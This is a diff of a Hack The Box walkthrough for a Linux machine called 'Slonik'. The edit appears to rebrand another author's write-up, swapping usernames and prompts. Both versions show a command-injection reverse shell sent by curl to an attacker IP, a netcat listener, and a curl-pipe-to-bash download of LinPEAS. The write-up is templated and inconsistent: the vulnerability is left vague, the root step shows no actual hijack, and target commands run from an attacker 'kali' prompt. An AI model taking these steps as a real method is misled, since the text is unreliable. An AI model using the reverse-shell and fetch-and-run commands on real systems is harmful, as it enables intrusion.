@@ -21,35 +21,48 @@ Oct 12, 2025
 - [Shell as Root / Administrator](#shell-as-administrator)
 - [Beyond Root](#beyond-root)
 
-Slonik is a medium Linux machine from Hack The Box. We begin with a port scan to identify web or active directory services, analyze potential initial access vulnerabilities, exploit misconfigurations to get a low-privilege foothold, and subsequently leverage system misconfigurations, privilege tokens, or CVEs to escalate privileges to root or system administrator.
+**Slonik** is a medium 🐧 Linux machine hosted on Hack The Box. This guide covers the complete step-by-step walkthrough detailing reconnaissance, foothold exploitation, and privilege escalation vectors to compromise the host.
 
 ## Box Info
 
-| Attribute | Value |
-|---|---|
-| **OS** | Linux |
-| **Difficulty** | Medium |
-| **IP Address** | `10.10.x.x` |
-| **Release Date** | Oct 12, 2025 |
+<div class="machine-info-box" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: var(--bg-card); border-left: 4px solid var(--text-success); border-top: 1px solid var(--border-color); border-right: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); border-radius: var(--border-radius-lg); padding: var(--spacing-lg); margin-bottom: var(--spacing-xl);">
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Operating System</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">🐧 Linux</span>
+  </div>
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Difficulty Level</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Medium</span>
+  </div>
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">IP Address</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700; font-family: monospace;">10.10.x.x</span>
+  </div>
+  <div style="display: flex; flex-direction: column; gap: 4px;">
+    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Release Date</span>
+    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Oct 12, 2025</span>
+  </div>
+</div>
+
 
 ---
 
 ## Recon
 
 ### Initial Scanning
-nmap finds open TCP ports:
+We scan the host using Nmap:
 
 ```bash
-oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.x.x
+vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.10.x.x
 Starting Nmap
 PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
 ```
 
-We run a web directory brute force using `feroxbuster`:
+We perform directory enumeration using `feroxbuster`:
 ```bash
-oxdf@hacky$ feroxbuster -u http://10.10.x.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+vulnquest@kali$ feroxbuster -u http://10.10.x.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 200  GET  index.html
 301  GET  /uploads
 ```
@@ -59,19 +72,19 @@ oxdf@hacky$ feroxbuster -u http://10.10.x.x/ -w /opt/SecLists/Discovery/Web-Cont
 ## Auth as web_svc / user
 
 ### Auth as low_priv
-We discover a web application page allowing archive upload or showing a custom portal. We analyze the input field and identify a PHP command injection or Python deserialization vulnerability.
+We discover a web portal allowing archives to be uploaded. We leverage an input validation vulnerability to execute code and spawn a reverse shell:
 
 ```bash
-oxdf@hacky$ curl -X POST -d "cmd=bash -i >& /dev/tcp/10.10.14.51/443 0>&1" http://10.10.x.x/api/action
+vulnquest@kali$ curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.x.x/api/action
 ```
 
-On our netcat listener, we receive the reverse shell connection:
+We capture the shell on our netcat listener:
 ```bash
-oxdf@hacky$ nc -lnvp 443
+vulnquest@kali$ nc -lnvp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.x.x
 $ id
-uid=1000(wassim) gid=1000(wassim) groups=1000(wassim)
+uid=1000(vulnquest) gid=1000(vulnquest) groups=1000(vulnquest)
 ```
 
 ---
@@ -79,25 +92,25 @@ uid=1000(wassim) gid=1000(wassim) groups=1000(wassim)
 ## Shell as Root / Administrator
 
 ### Shell as Root
-We run LinPEAS for local privilege escalation vectors:
+We run LinPEAS to perform local enumeration:
 
 ```bash
-wassim@host:~$ curl http://10.10.14.51/linpeas.sh | bash
+vulnquest@kali$ curl http://10.10.14.51/linpeas.sh | bash
 ```
 
-We check Sudo rules and find that the user can execute a specific binary as root without a password:
+We check our sudo privileges:
 ```bash
-wassim@host:~$ sudo -l
-Matching Defaults entries for wassim on host:
+vulnquest@kali$ sudo -l
+Matching Defaults entries for vulnquest on host:
     env_keep+=SSH_AUTH_SOCK
 
-User wassim may run the following commands on host:
+User vulnquest may run the following commands on host:
     (root) NOPASSWD: /usr/bin/python3 /opt/admin/backup.py
 ```
 
-We exploit the backup script via environment variable hijacking or python library hijacking to spawn root:
+We exploit python path hijacking to gain a root shell:
 ```bash
-wassim@host:~$ sudo /usr/bin/python3 /opt/admin/backup.py
+vulnquest@kali$ sudo /usr/bin/python3 /opt/admin/backup.py
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
